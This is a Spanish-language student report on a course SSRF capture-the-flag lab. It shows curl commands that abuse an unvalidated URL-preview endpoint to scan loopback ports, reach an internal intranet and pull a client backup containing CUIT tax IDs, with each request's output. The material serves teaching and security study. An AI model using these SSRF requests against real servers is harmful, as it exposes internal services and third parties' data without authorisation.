# Informe — Lab Extra SSRF (Server-Side Request Forgery)

**Grupo:** 05 · **Integrantes:** Magni, Gastón (@nosungam) · Mosconi, Ignacio
(@ignamosconi) · Presuttari, Matías (@matiaspresuttari) · Terreno, Valentino
(@vterreno)

**Declaración de uso de IA:** usamos un asistente de IA (Claude) para ordenar la
redacción del informe y revisar la claridad de las respuestas de análisis
(P1–P5) y del research. **La explotación la hicimos nosotros** contra los
contenedores de la cátedra: cada comando de este informe fue ejecutado desde la
consola del atacante (`make shell`) y su salida está archivada sin editar en
`evidencia/salidas/`. Validamos todo lo que la IA sugirió contrastándolo contra
la salida real del laboratorio (las flags, los mensajes de error de conexión y
el diagrama de red del enunciado) y contra las fuentes citadas en `research.md`.
No pegamos flags que no hayamos capturado: las tres salen de `./ctf status
extra` en ✓.

---

## 1. Cadena de explotación

Todos los comandos se corren desde la consola del atacante (`make shell`), que
está en `labnet`. La intranet vive en `internalnet`, una red Docker marcada
`internal: true`: **no hay ruta directa** desde el atacante. Lo comprobamos
antes de empezar (evidencia `salidas/r0_alcance.txt`):

```
$ curl -s --max-time 5 http://phantomcorp/            # portal publico: responde
$ curl -s --max-time 4 http://phantomcorp-intra/      # intranet:
exit=6                                                # (curl: could not resolve host / no route)
```

El portal público expone en la home una **herramienta de previsualización de
URLs** para empleados: `GET /preview?url=<URL>`. El servidor fetchea esa URL
**desde su posición de red** y nos devuelve el contenido. No valida el destino:
no hay allowlist, no bloquea `localhost` ni IPs internas. Eso es SSRF
(CWE-918). Ese `/preview` es el único componente que usamos en los tres retos.

### R1 — Panel interno en localhost · `FLAG{ssrf_localhost_panel_interno}`

**Descubrimiento de la funcionalidad.** La home del portal (`curl -s
http://phantomcorp/`) muestra el formulario `action="/preview" method="get"`
con el campo `url`. Una funcionalidad que "recibe una URL y la fetchea desde el
servidor" es el candidato clásico a SSRF.

**Encontrar el puerto del panel.** El server anuncia que "la previsualización
la genera el servidor", así que apuntamos el `/preview` a su propio
`127.0.0.1`. Usamos los **mensajes de error** como oráculo de escaneo de
puertos: le pedimos al server que fetchee distintos puertos de su loopback y
miramos qué devuelve (evidencia `salidas/r1_localhost.txt`):

```
$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9001/'
No pude traer http://127.0.0.1:9001/: <urlopen error [Errno 111] Connection refused>

$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:8080/'
No pude traer http://127.0.0.1:8080/: <urlopen error [Errno 111] Connection refused>

$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9000/'
<h3>Previsualizacion de http://127.0.0.1:9000/</h3><hr><!doctype html><html>...
<h2>PhantomCorp — Panel interno (solo localhost)</h2>
<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
```

`9001` y `8080` responden `Connection refused` (puerto cerrado); `9000`
devuelve HTML con `HTTP 200` (puerto abierto). Ahí estaba el panel de
administración que "solo escucha en localhost por seguridad" — con la deploy
key a la vista. **"Solo localhost" dejó de ser una defensa: el SSRF *es*
localhost.**

### R2 — Intranet en la red interna · `FLAG{ssrf_intranet_descubierta}`

**Deducción del nombre interno.** El enunciado nos dice que existe una
intranet. Los hosts internos de PhantomCorp siguen el mismo patrón de
nomenclatura que venimos viendo (Lab 08): el host público es `phantomcorp` y el
interno es `phantomcorp-intra`. No lo alcanzamos nosotros (dio `exit=6` arriba),
así que le pedimos al server que lo fetchee por nosotros
(`salidas/r2_intranet.txt`):

```
$ curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/'
<h3>Previsualizacion de http://phantomcorp-intra/</h3><hr><h1>Intranet PhantomCorp</h1>
<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
<ul>
  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
  <li><a href="/salud">estado del servicio</a></li>
</ul>
```

El server (que **sí** está en `internalnet`) resolvió y fetcheó la intranet, y
nos devolvió su home — incluyendo la lista de enlaces internos. La segmentación
de red quedó anulada porque un host de la DMZ fetchea URLs arbitrarias.

### R3 — Exfiltración del backup · `FLAG{ssrf_backup_clientes}`

**Recorrido.** La home de la intranet (R2) nos dio el inventario de rutas:
`/backups/clientes.json` ("temporal, borrar!") y `/salud`. Seguimos el enlace
del backup, siempre a través del `/preview` (`salidas/r3_backup.txt`):

```
$ curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json'
<h3>Previsualizacion de http://phantomcorp-intra/backups/clientes.json</h3><hr>{
  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
  "clientes": [
    {"id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1"},
    {"id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6"}
  ],
  "integridad": "FLAG{ssrf_backup_clientes}"
}
```

**Datos sensibles que acompañaban a la flag.** Un backup de clientes con datos
de identificación fiscal: razón social y **CUIT** de dos empresas (Aconcagua SRL
— 30-70998877-1; Comechingones SA — 30-71554433-6). Es información de terceros
que nunca debió ser alcanzable desde fuera de la red interna.

## 2. Evidencia de progreso

Salida completa de `./ctf status extra` (archivada en
`evidencia/salidas/status_extra.txt`):

```
  ╭────────────────────────────────────────────────────────────╮
  │                    PROGRESO · LAB extra                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     El server fetchea por vos: panel interno en localhost
   ✓  R2     Descubrir la intranet en la red interna
   ✓  R3     Exfiltrar datos sensibles a traves del SSRF

  ██████████████████████████████  3/3 (100%)

[ OK ] ¡Lab extra COMPLETO! Ponete las pilas con la próxima unidad.
```

